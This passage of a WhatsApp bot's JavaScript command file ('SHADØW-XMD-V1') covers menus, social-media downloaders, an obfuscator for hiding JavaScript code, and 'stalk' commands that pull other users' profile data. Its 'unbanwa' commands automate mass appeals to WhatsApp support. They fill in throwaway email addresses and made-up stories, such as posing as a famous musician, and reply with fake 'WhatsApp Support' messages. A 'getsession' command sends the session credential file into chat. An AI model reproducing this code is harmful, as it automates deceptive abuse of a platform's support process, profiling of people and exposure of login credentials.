╭ *𓊈 ᴇxᴀᴍᴘʟᴇ 𓊉*
┃
┃➪ *.ʀᴀᴍ ᴜsᴇʀɴᴀᴍᴇ,ɴᴜᴍʙᴇʀ*
┃➪ *.1ɢʙ ɴᴜᴍʙᴇʀ, 234xxx*
╰❍
> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠᴏʟᴛᴀɢᴇ ʟᴏʀᴅ ᴅᴇᴠ`
const imagePath = './data/image/jdw.jpg'; // Path to 
const menuImage = fs.readFileSync(imagePath);
await LordVoltage.sendMessage(
                                m.chat,
                                {
                                    image: menuImage,
                                    caption: meny});
        }}      
break
case 'shadow': {if (prefix === '.') {
await LordVoltage.sendMessage(m.chat, { react: { text: "🎭",key: m.key,}})
const uptime = getUptime();
replynano(`
╭ 𝗦𝗣𝗔𝗥𝗞 𝗠𝗗 𝗩𝟭
𝗗𝗔𝗧𝗘: ${xdate}
𝗨𝗦𝗘𝗥: ${pushname}
𝗠𝗢𝗗𝗘: ${LordVoltage.public ? '𝗣𝗨𝗕𝗟𝗜𝗖' : '𝗦𝗘𝗟𝗙'}

╭ 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢
𝗥𝗨𝗡𝗧𝗜𝗠𝗘: ${uptime}
𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥: 𝗟𝗢𝗥𝗗 ${ownername}

╭ 𝗖𝗥𝗘𝗗𝗜𝗧𝗦
𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝘄𝗮𝘀 𝗰𝗿𝗲𝗮𝘁𝗲𝗱 𝗯𝘆 𝗟𝗢𝗥𝗗 ${ownername}
𝗔𝗹𝗹 𝗽𝗶𝗰𝘁𝘂𝗿𝗲𝘀 𝘄𝗲𝗿𝗲 𝗱𝗲𝘀𝗶𝗴𝗻𝗲𝗱 𝗯𝘆 𝗥𝗶𝗳𝗹𝗲
𝗕𝗶𝗴 𝘁𝗵𝗮𝗻𝗸𝘀 𝘁𝗼 𝗮𝗹𝗹 𝗺𝘆 𝗳𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 𝗮𝗻𝗱 𝘁𝗵𝗼𝘀𝗲 𝘄𝗵𝗼
𝗜𝗻𝘀𝗽𝗶𝗿𝗲𝗱 𝗺𝗲
╰\`𝗯𝗲𝘀𝘁 𝗮𝘂𝘁𝗼 𝗺𝗮𝘁𝗲𝗱 𝘄𝗵𝗮𝘁𝘀𝗮𝗽𝗽 𝗯𝗼𝘁\``)
}
}
break
case 'friend':
case 'searchfriend':{if (prefix === '.') {
reply(mess.wait)
let teman = pickRandom(dansyaverifikasiuser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replynano('Managed to Get One Person')
}, 5000)
setTimeout(() => {
LordVoltage.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}}
break
case 'repo':
case 'script': 
case 'sc': {
  if (prefix === '.') {
    await LordVoltage.sendMessage(m.chat, { react: { text: "🌐", key: m.key } });
  let meta = `WANT SHADØW-XMD-V1!!!

╭ 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡
┃ WEBSITE: ${websitex}
┃ YOUTUBE: ${yt}
┃ USER: ${pushname}
┃ INFO: FOLLOW ALL SOCIALS TO GET SHADØW-XMD-V1`;

    await LordVoltage.sendMessage(m.chat, {
      text: meta    
    }, { quoted: fkontak });
    
    setTimeout(async () => {
  let vivo = `HEY FAM 😁: *${pushname}*!!! 
YOU WANT SHADØW-XMD-V1

[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]
𝘞𝘌𝘉𝘚𝘐𝘛𝘌: ${websitex}
𝘠𝘖𝘜𝘛𝘜𝘉𝘌: ${yt}
𝘙𝘌𝘗𝘖: ${socialm}

[ 𝐊𝐄𝐘 𝐒𝐓𝐄𝐏𝐒 𝐓𝐎 𝐅𝐎𝐋𝐋𝐎𝐖 ]
> IF YOU WANT TO DEPLOY SHADØW-XMD-V1, TAP ON REPO, STAR '☆' AND FORK THE REPOSITORY ON CHROME (GITHUB). DOWNLOAD ZIP BY TAPPING THE GREEN CODE, COME BACK TO WHATSAPP AND TAP ON YOUTUBE, SUBSCRIBE THEN WATCH AND FOLLOW STEPS ON HOW TO DEPLOY SHADØW-XMD-V1 BOT. WHEN YOU ARE DONE, COME BACK AGAIN, TAP CHANNEL, THEN FOLLOW TO GET MORE UPDATES ON YOUR BOT`;
const imagePath = './data/image/repo.jpg'; // Path to 
const menuImage = fs.readFileSync(imagePath);
await LordVoltage.sendMessage(
                                m.chat,
                                {
                                    image: menuImage,
                                    caption: vivo,contextInfo:{
forwardingScore: 0, 
isForwarded: true, 
 forwardedNewsletterMessageInfo: {
          newsletterJid: '120363400964601488@newsletter', 
         newsletterName: '[𝐒𝐀𝐌𝐒𝐔𝐍𝐆_𝐗𝐌𝐃]' 
        },
}},{ quoted: fkontak });
     }, 3000); 
        }}   
  break;
  
                  case 'encrypt':
                   case 'enc':
                    case 'obfuscate': {if (prefix === '.') {
            let tempOriginalFilePath = null;
            let tempObfuscatedFilePath = null;
            let finalObfuscatedFilename = null;

            if (!m.quoted) return m.reply("Reply to a .js file to encrypt it.");
            if (m.quoted.mtype !== 'documentMessage' || m.quoted.mimetype !== "application/javascript") {
                return m.reply("Please reply to a JavaScript (.js) file.");
            }

            try {
                // await loading(); // Uncomment if you have a 'loading' function
                await m.reply("Processing hard encryption...");

                let media = await m.quoted.download();
                let originalFilename = m.quoted.fileName || `input_${Date.now()}.js`;

                tempOriginalFilePath = `./temp_original_${Date.now()}_${originalFilename}`;
                await fs.writeFileSync(tempOriginalFilePath, media);

                const fileContent = fs.readFileSync(tempOriginalFilePath, 'utf-8');

                const obfuscatedResult = await JsConfuser.obfuscate(fileContent, {
                    target: "node",
                    preset: "high",
                    compact: true,
                    minify: true,
                    flatten: true,
                    identifierGenerator: function() {
                        const baseName = "庫FAMØUS-DEV種";
                        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_';
                        let randomSuffix = '';
                        const allChars = chars + '0123456789';
                        for (let i = 0; i < 5; i++) {
                            randomSuffix += allChars.charAt(Math.floor(Math.random() * allChars.length));
                        }
                        return baseName + '_' + randomSuffix;
                    },
                    renameVariables: true,
                    renameGlobals: true,
                    stringEncoding: 0.01,
                    stringSplitting: 0.1,
                    stringConcealing: true,
                    stringCompression: true,
                    duplicateLiteralsRemoval: true,
                    shuffle: { hash: false, true: false },
                    controlFlowFlattening: false,
                    opaquePredicates: false,
                    deadCode: false,
                    dispatcher: false,
                    rgf: false,
                    calculator: false,
                    hexadecimalNumbers: false,
                    movedDeclarations: true,
                    objectExtraction: true,
                    globalConcealing: true
                });

                let obfuscatedCode;
                if (typeof obfuscatedResult === 'string') {
                    obfuscatedCode = obfuscatedResult;
                } else if (obfuscatedResult && typeof obfuscatedResult === 'object' && obfuscatedResult.code) {
                    obfuscatedCode = obfuscatedResult.code;
                } else {
                    throw new Error("JsConfuser returned an unexpected format.");
                }

                const outputFolderPath = './obfuscated_files';
                if (!fs.existsSync(outputFolderPath)) {
                    fs.mkdirSync(outputFolderPath);
                }

                finalObfuscatedFilename = `encrypted_${originalFilename}`;
                tempObfuscatedFilePath = `${outputFolderPath}/${finalObfuscatedFilename}`;
                
                // --- ALWAYS SAVE LOCALLY FIRST ---
                await fs.writeFileSync(tempObfuscatedFilePath, obfuscatedCode);
                await m.reply(` *✅ File encrypted and saved locally at: \n\`${tempObfuscatedFilePath}\`\n If You dont see your file in 1min, kindly visit your panel to get the file at the saved place. delete when ure done downloading. to save ur panel space..*`);

                // --- ATTEMPT TO SEND VIA WHATSAPP (with robust error handling) ---
                const stats = fs.statSync(tempObfuscatedFilePath);
                const fileSizeInBytes = stats.size;
                const WHATSAPP_MAX_DOC_SIZE_BYTES = 100 * 1024 * 1024; // 100 MB
                const DELETE_TIMEOUT_MS = 2 * 60 * 1000; // 2 minutes in milliseconds

                let sentSuccessfully = false;

                if (fileSizeInBytes <= WHATSAPP_MAX_DOC_SIZE_BYTES) {
                    try {
                        await m.reply("Attempting to send file via WhatsApp...");
                        await LordVoltage.sendMessage(m.chat, {
                            document: fs.readFileSync(tempObfuscatedFilePath),
                            mimetype: "application/javascript",
                            fileName: finalObfuscatedFilename,
                            caption: "✅ Encrypted JS File (Direct Send)"
                        }, { quoted: m });
                        await m.reply(`✅ File sent successfully via WhatsApp!`);
                        sentSuccessfully = true; // Mark as sent
                    } catch (sendError) {
                        console.error("WhatsApp send error:", sendError);
                        await m.reply(`⚠️ Failed to send file via WhatsApp: ${sendError.message || sendError}. \n\nThe file is still saved locally at: \n\`${tempObfuscatedFilePath}\`\n\n(This might be due to connection instability or temporary WhatsApp issues.)`);
                    }
                } else {
                    await m.reply(`⚠️ File is too large (${(fileSizeInBytes / (1024 * 1024)).toFixed(2)} MB) to send via WhatsApp.`);
                    await m.reply(`Please retrieve it manually from: \n\`${tempObfuscatedFilePath}\``);
                }

                // --- TIMED DELETION LOGIC ---
                if (sentSuccessfully) {
                    // Delete immediately if successfully sent via WhatsApp
                    fs.unlinkSync(tempObfuscatedFilePath);
                    await m.reply("Local copy of encrypted file deleted.");
                } else {
                    // If not sent, schedule deletion after a timeout
                    await m.reply(`\n❗ IMPORTANT: This file will be automatically deleted from the server in ${DELETE_TIMEOUT_MS / 1000 / 60} minutes.`);
                    setTimeout(() => {
                        if (fs.existsSync(tempObfuscatedFilePath)) {
                            fs.unlinkSync(tempObfuscatedFilePath);
                            console.log(`[FILE CLEANUP] Deleted: ${tempObfuscatedFilePath}`);
                        }
                    }, DELETE_TIMEOUT_MS);
                }

                // Clean up the original temporary file regardless
                fs.unlinkSync(tempOriginalFilePath);

            } catch (e) {
                console.error("Major Encryption process error:", e);
                await m.reply(`❌ Critical error during encryption process: ${e.message || e}`);
                // Ensure cleanup of original temp file
                if (tempOriginalFilePath && fs.existsSync(tempOriginalFilePath)) fs.unlinkSync(tempOriginalFilePath);
                // If obfuscated file was created before the error, inform user but it will be deleted by setTimeout logic
                if (tempObfuscatedFilePath && fs.existsSync(tempObfuscatedFilePath)) {
                    await m.reply(`Partial or complete obfuscated file may be found at: \n\`${tempObfuscatedFilePath}\`\nIt will be deleted automatically.`);
                    const DELETE_TIMEOUT_MS = 2 * 60 * 1000; // Same 2 minutes timeout
                    setTimeout(() => {
                        if (fs.existsSync(tempObfuscatedFilePath)) {
                            fs.unlinkSync(tempObfuscatedFilePath);
                            console.log(`[FILE CLEANUP] Deleted (after critical error): ${tempObfuscatedFilePath}`);
                        }
                    }, DELETE_TIMEOUT_MS);
                }
            }
        }}
        break;

  
  case 'channel': { if (prefix === '.') { let chan ='*ρяєѕѕ νιєω ¢нαηηєℓ вєℓρω ☟*'
LordVoltage.sendMessage(m.chat,{text: chan, 
contextInfo:{
forwardingScore: 0, 
isForwarded: true, 
 forwardedNewsletterMessageInfo: {
          newsletterJid: '120363400964601488@newsletter', 
         newsletterName: '[𝐒𝐀𝐌𝐒𝐔𝐍𝐆_𝐗𝐌𝐃]' 
        },
}},{ quoted: fkontak });
}}  
break
case 'getsession':if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
replynano('Wait a moment, currently retrieving your session file')
let sesi = await fs.readFileSync('./session/creds.json')
LordVoltage.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {
quoted: m
})}
break

case 'igstalk2':{if (prefix === '.') {
reply(mess.wait)
if (!q) return replynano(`Example ${prefix+command} voltagefx6`)
reply(mess.wait)
const aj = await igstalk(`${q}`)
LordVoltage.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Instagram Stalker \\*

Full name : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}}
break
case 'ffstalk':{if (prefix === '.') {
reply(mess.wait)
if (!q) return replynano(`Example ${prefix+command} 234xxxx`)
reply(mess.wait)
const data = await fetchJson(`https://apis.davidcyriltech.my.id/ffstalk?id=${encodeURIComponent(text)}`)
const data1 = data.data.roles
replynano(`*/ Free Fire Stalker \\*

Id : ${data1.player_id}
Nickname : ${data1.role}`)
}}
break
case 'mlstalk': {if (prefix === '.') {
if (!text) return reply(`Example usage: \n${prefix + command} id|zone id\n\nEx.\n${prefix + command} 157228049|2241`)
 async function mlstalk(id, zoneId) {
    return new Promise(async (resolve, reject) => {
      axios
        .post(
          'https://api.duniagames.co.id/api/transaction/v1/top-up/inquiry/store',
          new URLSearchParams(
            Object.entries({
              productId: '1',
              itemId: '2',
              catalogId: '57',
              paymentId: '352',
              gameId: id,
              zoneId: zoneId,
              product_ref: 'REG',
              product_ref_denom: 'AE',
            })
          ),
          {
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              Referer: 'https://www.duniagames.co.id/',
              Accept: 'application/json',
            },
          }
        )
        .then((response) => {
          resolve(response.data.data.gameDetail)
        })
        .catch((err) => {
          reject(err)
        })
    })
}

var { userName } = await mlstalk(text.split('|')[0], text.split('|')[1]).catch(async _ => await reply("User not found"))
var vf = `*MOBILE LEGENDS STALK*

*ID: ${text.split('|')[0]}*
*ZONA ID: ${text.split('|')[1]}*
*Username: ${userName ? userName : "Empty"}*`
reply(vf)
         }}
         break
case 'npmstalk':{if (prefix === '.') {
  reply(mess.wait)
if (!q) return replynano(`Example ${prefix+command}baleys-mod`)
reply(mess.wait)
eha = await npmstalk.npmstalk(q)
replynano(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}}
break
//=========================================\\
                case 'twitter':
    case 'tweet':
    case 'twdl': {
      if (!text || !text.startsWith("https://")) {
        return replynano("❌ Please provide a valid Twitter URL.");
      }

      const initialReaction = '🔍'; // Your preferred initial downloading emoji
      const downloadReaction = '✅'; // Your preferred download mark emoji
      const failedReaction = '❌';   // Your preferred failed emoji
      const downloadingReaction = '⏳'; // Your preferred downloading emoji

      await LordVoltage.sendMessage(m.chat, {
        react: { text: initialReaction, key: m.key }
      });

      try {
        const response = await axios.get(`https://www.dark-yasiya-api.site/download/twitter?url=${text}`);
        const data = response.data;

        if (!data || !data.status || !data.result) {
          await LordVoltage.sendMessage(m.chat, { react: { text: failedReaction, key: m.key } });
          return replynano("⚠️ Failed to retrieve Twitter video. Please check the link and try again.");
        }

        const { desc, thumb, video_sd, video_hd } = data.result; // Removed Duration and Uploaded for this format

        const caption = `∘ *SHADØW-XMD-V1 TWITTER- PLAYER*\n`
          + `∘ *ᴅᴇsᴄʀɪᴘᴛɪᴏɴ:*\n`
          + `\`${desc || "No description"}\`\n\n`
          + `*ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴘᴛɪᴏɴs:*\n`
          + `∘ <1> sᴅ ᴏ̨ᴜᴀʟɪᴛʏ\n`
          + `∘ <2> ʜᴅ ᴏ̨ᴜᴀʟɪᴛʏ\n\n`
          + `*ᴀᴜᴅɪᴏ ᴏᴘᴛɪᴏɴs:*\n`
          + `∘ <3> ᴀᴜᴅɪᴏ\n`
          + `∘ <4> ᴅᴏᴄᴜᴍᴇɴᴛ\n`
          + `∘ <5> ᴠᴏɪᴄᴇ\n\n`
          + `*REPLY WITH THE NUMBER TO DOWNLOAD YOUR CHOICE.*`;

        const sentMsg = await LordVoltage.sendMessage(m.chat, {
          image: { url: thumb },
          caption: caption
        }, { quoted: m });

        const messageID = sentMsg.key.id;

        LordVoltage.ev.on("messages.upsert", async (msgData) => {
          const receivedMsg = msgData.messages[0];
          if (!receivedMsg.message) return;

          const receivedText = receivedMsg.message.conversation || receivedMsg.message.extendedTextMessage?.text;
          const senderID = receivedMsg.key.remoteJid;
          const isReplyToBot = receivedMsg.message.extendedTextMessage?.contextInfo?.stanzaId === messageID;

          if (isReplyToBot) {
            await LordVoltage.sendMessage(senderID, {
              react: { text: downloadReaction, key: receivedMsg.key }
            });

            switch (receivedText) {
              case "1":
                await LordVoltage.sendMessage(senderID, {
                  video: { url: video_sd },
                  caption: "*⏤͟͟͞͞ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ɪɴ sᴅ ᴏ̨ᴜᴀʟɪᴛʏ ͟͞͞⏤*"
                }, { quoted: receivedMsg });
                break;

              case "2":
                await LordVoltage.sendMessage(senderID, {
                  video: { url: video_hd },
                  caption: "*⏤͟͟͞͞ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ɪɴ ʜᴅ ᴏ̨ᴜᴀʟɪᴛʏ ͟͞͞⏤*"
                }, { quoted: receivedMsg });
                break;

              case "3":
                await LordVoltage.sendMessage(senderID, {
                  audio: { url: video_sd },
                  mimetype: "audio/mpeg"
                }, { quoted: receivedMsg });
                break;

              case "4":
                await LordVoltage.sendMessage(senderID, {
                  document: { url: video_sd },
                  mimetype: "audio/mpeg",
                  fileName: "Twitter_Audio.mp3",
                  caption: "*⏤͟͟͞͞ᴀᴜᴅɪᴏ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴀs ᴅᴏᴄᴜᴍᴇɴᴛ ͟͞͞⏤*"
                }, { quoted: receivedMsg });
                break;

              case "5":
                await LordVoltage.sendMessage(senderID, {
                  audio: { url: video_sd },
                  mimetype: "audio/mp4",
                  ptt: true
                }, { quoted: receivedMsg });
                break;

              default:
                replynano("❌ Invalid option! Please reply with 1, 2, 3, 4, or 5.");
            }
          }
        });

      } catch (error) {
        console.error("Error:", error);
        await LordVoltage.sendMessage(m.chat, { react: { text: failedReaction, key: m.key } }); // React with X on error
        replynano("❌ An error occurred while processing your request. Please try again.");
      }
    }
    break;

//=========================================\\
case 'tt': { if (prefix === '.') {
  if (!text) return replynano(`Example: ${prefix + command} link`);
reply(mess.wait)
try {
  const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)
  const vidnya = data.video.noWatermark
  const caption = `*𓊈 ѕᴘᴀʀᴋ ᴍᴅ - ᴛɪᴋᴛᴏᴋ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ 𓊉*

\`ᴜѕᴇʀɴᴀᴍᴇ :\` *${data.author.name ?? ''} (@${data.author.unique_id ?? ''})*
\`ʟɪᴋᴇѕ :\` *${data.stats.likeCount ?? ''}*
\`ᴄᴏᴍᴍᴇɴᴛѕ :\` *${data.stats.commentCount ?? ''}*
\`ѕʜᴀʀᴇѕ :\` *${data.stats.shareCount ?? ''}*
\`ᴘʟᴀʏѕ :\` *${data.stats.playCount ?? ''}*
\`ѕᴀᴠᴇѕ :\` *${data.stats.saveCount ?? ''}*
> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧
`;
  LordVoltage.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
} catch {
  const response = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(text)}`)
  const videoUrl = response.result.video;
  const captionn = `*★ TIKTOK DOWNLOADER ★*

Likes: ${response.result.statistics.likeCount ?? ''}
Comments: ${response.result.statistics.commentCount ?? ''}
Shares: ${response.result.statistics.shareCount ?? ''}
by ${response.result.author.nickname ?? ''}

\`⏤͟͟͞͞ Downloaded By ${botname}\`
  `;
  LordVoltage.sendMessage(m.chat, { caption: captionn, video: { url: videoUrl } }, { quoted: m })
}

}}
break;
//==============================================
       case "instagram": case "igdl": case "ig": {
      if (prefix === '.') {
        const { igdl } = require("ruhend-scraper");

        if (!text) {
          return replynano("Please provide an Instagram link for the video/image.");
        }

        const instagramPatterns = [
          /https?:\/\/(?:www\.)?instagram\.com\//,
          /https?:\/\/(?:www\.)?instagr\.am\//,
          /https?:\/\/(?:www\.)?instagram\.com\/p\//,
          /https?:\/\/(?:www\.)?instagram\.com\/reel\//,
          /https?:\/\/(?:www\.)?instagram\.com\/tv\//
        ];

        const isValidUrl = instagramPatterns.some(pattern => pattern.test(text));

        if (!isValidUrl) {
          return replynano("That is not a valid Instagram link. Please provide a valid post, reel, or video link.");
        }

        await LordVoltage.sendMessage(m.chat, {
          react: { text: '⏳', key: m.key }
        });

        try {
          const downloadData = await igdl(text);

          if (!downloadData || !downloadData.data || downloadData.data.length === 0) {
            await LordVoltage.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return replynano("No media found at the provided link.");
          }

          await LordVoltage.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); // Success reaction

          const mediaData = downloadData.data;
          for (let i = 0; i < Math.min(20, mediaData.length); i++) {
            const media = mediaData[i];
            const mediaUrl = media.url;

            const isVideo = /\.(mp4|mov|avi|mkv|webm)$/i.test(mediaUrl) ||
                              media.type === 'video' ||
                              text.includes('/reel/') ||
                              text.includes('/tv/');

            if (isVideo) {
              await LordVoltage.sendMessage(m.chat, {
                video: { url: mediaUrl },
                mimetype: "video/mp4",
                caption: `> *POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧*`
              }, { quoted: m });
            } else {
              await LordVoltage.sendMessage(m.chat, {
                image: { url: mediaUrl },
                caption: `> *POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧*`
              }, { quoted: m });
            }
          }
        } catch (error) {
          console.error('Error in Instagram command:', error);
          await LordVoltage.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
          return replynano("An error occurred while processing the request.");
        }
      }
    }
    break;

case 'ttmp3': {if (prefix === '.') {
  if (typeof text !== "string" || !text.trim()) {
    return replynano(`Send command with a TikTok link: ${prefix + command} <Link>`);
  }
  await LordVoltage.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });
  try {
    const res = await fetch(`https://api.diioffc.web.id/api/download/tiktok?url=${encodeURIComponent(text)}`);
    const response = await res.json();
    if (!response?.status) {
      return replynano(' Failed to get data.');
    }
    const { music_info } = response.result;
    if (music_info?.play) {
      await LordVoltage.sendMessage(m.chat, {
        audio: { url: music_info.play },
        mimetype: "audio/mpeg",
        contextInfo: {
          externalAdReply: {
            title: music_info.title || 'TikTok Audio',
            body: "Audio from TikTok",
            thumbnailUrl: music_info.cover,
            mediaType: 1
          }
        }
      }, { quoted: m });
      await LordVoltage.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });
    } else {
      replynano(' Failed to get audio link from the response.');
      await LordVoltage.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    }
  } catch (error) {
    console.error(error);
    replynano(' An error occurred while getting Audio.');
    await LordVoltage.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
  }
}}
break;
case 'ghstalk': case 'githubstalk':{ if (prefix === '.') {
reply(mess.wait)
if (!q) return replynano(`Example ${prefix+command} FAMOUS-TECH-DEV`)
reply(mess.wait)
aj = await githubstalk.githubstalk(`${q}`)
LordVoltage.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*Github Stalk*

*υѕєяηαмє :* ${aj.username}
*ηι¢кηαмє :* ${aj.nickname}
*вισ :* ${aj.bio}
*ι∂ :* ${aj.id}
*ησ∂єι∂ :* ${aj.nodeId}
*υяℓ ρяσƒιℓє :* 
${aj.profile_pic}
*υяℓ gιтнυв :* 
${aj.url}
*туρє* : ${aj.type}
*α∂мιη :* ${aj.admin}
*¢σмραηу :* ${aj.company}
*вℓσg :* ${aj.blog}
*ℓσ¢αтιση :* ${aj.location}
*ємαιℓ :* ${aj.email}
*ρυвℓι¢ яєρσ :* ${aj.public_repo}
*ρυвℓι¢ gιѕтѕ :* ${aj.public_gists}
*ƒσℓℓσωєяѕ :* ${aj.followers}
*ƒσℓℓσωιηg :* ${aj.following}
*¢яєαтє∂ αт :* ${aj.ceated_at}
*υρ∂αтє∂ αт :* ${aj.updated_at}` }, { quoted: m } )
}}
break

case 'unbanwa': { if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Can't verify My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `To: WhatsApp Developers

I am quite a famous musician, I have a very busy performance schedule this month. However, you have blocked my WhatsApp permanently, in my WhatsApp there is important data for my performance tomorrow. So please unblock my number now ${target} otherwise I will be complained and insulted by my fans`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replynano(`Wait 1-24 hours for the unbanned process from the bot and wait ±30 seconds to see the email reply from WhatsApp sir Hw Mods  🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replynano(`##- WhatsApp Support -##

Hello,

Thank you for contacting us.

Our system flags your account activity as a violation of our Terms of Service and blocks your phone number. We really appreciate you as a user. We apologize for any confusion or inconvenience caused by this issue.

We have removed the block after reviewing your account activity. You should now have access to WhatsApp.

As a next step, we recommend re-registering your phone number on WhatsApp to ensure you have access. You can visit our website to

download WhatsApp or the WhatsApp Business application.`)
} else if (payload.includes(`"payload":false`)) {
replynano(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replynano(util.format(res.data))
} catch (err) {replynano(`${err}`)}
} else replynano('Enter target number!')
}}
break




case 'unbanwav2': { if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replynano(`Can't verify My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Dear WhatsApp, we ask for your immediate assistance
[${targetnya}]
I have sent several emails and reports to WhatsApp to submit an appeal so that my number is quickly removed from the blocked list. I really need it for personal purposes to communicate with my family. If I have committed a previous violation then I will use my number more carefully and better than before and I have now complied with what WhatsApp suggested, and I really hope that now my number can be used again. Thank You`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replynano(`Wait 1-24 hours for the unbanned process from the bot and wait ±30 seconds to see the email reply from WhatsApp sir Hw Mods🥺🙏`)

let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replynano(`##- WhatsApp Support -##

Hello,

Thank you for contacting us.

Our system flags your account activity as a violation of our Terms of Service and blocks your phone number. We really appreciate you as a user. We apologize for any confusion or inconvenience caused by this issue.

We have removed the block after reviewing your account activity. You should now have access to WhatsApp.

As a next step, we recommend re-registering your phone number on WhatsApp to ensure you have access. You can visit our website to

download WhatsApp or the WhatsApp Business application.`)
} else if (payload.includes(`"payload":false`)) {
replynano(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replynano(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else replynano('Enter target number!')
}}
break


case 'unbanwav3': { if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replynano(`Can't verify My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
